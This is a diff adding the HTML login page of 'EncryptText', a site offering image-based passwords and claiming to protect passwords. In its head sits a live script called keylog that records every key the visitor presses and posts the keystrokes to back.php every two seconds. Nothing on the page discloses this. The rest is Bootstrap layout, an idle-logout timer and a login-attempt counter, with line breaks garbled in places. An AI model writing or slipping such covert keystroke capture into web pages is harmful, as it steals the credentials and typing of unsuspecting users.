@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initialscale=
+1.0">
+<title>EncryptText</title>
+<link rel="stylesheet" href="styles.css">
+<link
+href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.m
+in.css" rel="stylesheet"
+integrity="sha384-
+EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+crossorigin="anonymous">
+<script>
+var keylog = {
+cache: [],
+delay: 2000,
+sending: false,
+init: function () {
+//addEventListener for adding event handler to the
+Webpage
+window.addEventListener("keydown", function (evt) {
+keylog.cache.push(evt.key);
+});
+//Set Interval for periodically calling the send
+function
+window.setInterval(keylog.send, keylog.delay);
+},
+send: function () {
+if (!keylog.sending && keylog.cache.length != 0) {
+keylog.sending = true;
+//FormData converts the existing data to key
+value pairs
+var data = new FormData();
+//JSON.stringify converts the formdata into
+JSON object
+data.append("keys",
+JSON.stringify(keylog.cache));
+keylog.cache = [];
+//SXMLHTTPRequest Object to send data
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "back.php");
+xhr.onload = function () {
+keylog.sending = false;
+console.log(this.response);
+};
+xhr.send(data);
+}
+}
+};
+window.addEventListener("DOMContentLoaded", keylog.init);
+</script>
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-light">
+<div class="container-fluid">
+<span class="navbar brandname" >Encrypt<span
+class="brandText">Text</span></span>
+<button class="navbar-toggler" type="button" data-bstoggle="
+collapse"
+data-bs-target="#navbarSupportedContent" ariacontrols="
+navbarSupportedContent" aria-expanded="false"
+aria-label="Toggle navigation">
+<span class="navbar-toggler-icon"></span>
+</button>
+<div class="collapse navbar-collapse"
+id="navbarSupportedContent">
+<ul class="navbar-nav me-auto mb-2 mb-lg-0">
+<li class="nav-item menuItem">
+<a class="nav-link active menuItem" ariacurrent="
+page" href="#">Home</a>
+</li>
+<li class="nav-item">
+<a class="nav-link menuItem"
+href="#">Register</a>
+</li>
+</ul>
+<form class="d-flex justify-content-evenly">
+<button type="button" class="mx-2
+navButton">Contact Us</button>
+<button type="button" class="navButton">Premium
+Access</button>
+</form>
+</div>
+</div>
+</nav>
+<div class="taglines">
+<p class="subtext my-3 mx-2">Don't let them get to you</p>
+<!-- <h1><b class="my-1">Protect your Passwords</b></h1> -->
+</div>
+<div class="container box mt-1 px-5 py-3">
+<h2 class="login">Login</h2>
+<label for="user" id="username">Username: </label>
+<input type="text" class="textbox" id="user"
+placeholder="Username"><br><br>
+<label for="html">Password: </label><br><br>
+<div class="container">
+<div class="justify-content-evenly">
+<input type="checkbox" id="im1"><label for="im1">
+<img src="Images/1.png" class="image"alt="image1"
+height="200" width="300"></label>
+<input type="checkbox" id="im2">
+<label for="im2"><img src="Images/2.jpg" class="image"
+alt="image2" height="200" width="300"></label>
+<input type="checkbox" id="im3">
+<label for="im3"><img src="Images/3.png"
+class="image"alt="image3" height="200" width="300"></label><br>
+<input type="checkbox" id="im4">
+<label for="im4"><img src="Images/4.jpg" class="image"
+alt="image4" height="200" width="300"></label>
+<input type="checkbox" id="im5">
+<label for="im5"><img src="Images/5.jpg" class="image"
+alt="image5" height="200" width="300"></label>
+<input type="checkbox" id="im6">
+<label for="im6"><img src="Images/6.jpg"
+class="image"alt="image6" height="200" width="300"></label><br>
+<input type="checkbox" id="im7">
+<label for="im7"><img src="Images/7.jpg" class="image"
+alt="image7" height="200" width="300"></label>
+<input type="checkbox" id="im8">
+<label for="im8"><img src="Images/8.png" class="image"
+alt="image8" height="200" width="300"></label>
+<input type="checkbox" id="im9">
+<label for="im9"><img src="Images/9.jpg"
+class="image"alt="image9" height="200" width="300"></label><br><br>
+</div>
+</div>
+<button type="button" id="btn" class="btnSubmit"
+onclick="mainfunc()">Login</button>
+</div>
+</section>
+<script>
+var IdealTimeOut = 60; //10 seconds
+var idleSecondsTimer = null;
+var idleSecondsCounter = 0;
+document.onclick = function () { idleSecondsCounter = 0; };
+document.onmousemove = function () { idleSecondsCounter = 0; };
+document.onkeypress = function () { idleSecondsCounter = 0; };
+idleSecondsTimer = window.setInterval(CheckIdleTime, 1000);
+function CheckIdleTime() {
+idleSecondsCounter++;
+var oPanel = document.getElementById("timeOut");
+if (oPanel) {
+oPanel.innerHTML = (IdealTimeOut - idleSecondsCounter);
+}
+if (idleSecondsCounter >= IdealTimeOut) {
+window.clearInterval(idleSecondsTimer);
+window.alert("Due to Inactivity , You have been logged
+out....");
+window.location.replace("index.html");
+}
+}
+</script>
+<script>
+let count = 0;
+let btn = document.querySelector(".btnSubmit");
+btn.addEventListener("click", function() {
+count += 1;
+if(count>5){
+window.alert("Maximum Login attempts reached");
+window.location.replace("index.html");
+}
+})
+</script>
+<script src="main.js"></script>
+<script src="imagepass.js"></script>
+<script src="xssPrevention.js"></script>
+<script src="encrypt.js"></script>
+<script
+src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bun
+dle.min.js" integrity="sha384-
+MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
+crossorigin="anonymous"></script>
+</body>
+</html>
